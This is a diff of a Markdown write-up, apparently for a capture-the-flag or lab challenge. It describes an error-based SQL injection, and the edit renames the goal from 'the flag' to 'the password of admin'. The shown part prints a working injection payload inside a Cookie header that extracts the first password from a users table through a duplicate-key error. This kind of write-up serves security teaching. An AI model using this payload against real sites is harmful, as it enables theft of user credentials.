@@ -25,7 +25,7 @@ It means that no value from database will be show on this page and users can not
 
 The solution is simple, 
 ####find a way to see the results of query in error. 
-here is the query for geting the flag:
+here is the query for geting the password of admin:
 
 ```
 Cookie: PHPSESSID=3407qk4ll60du17iusmoo6s6t4; MyCookie=" union select 1,2,3,count(*), concat((select password from users limit 0,1),floor(rand()*3))a from information_schema.tables group by a--+; Admin=1
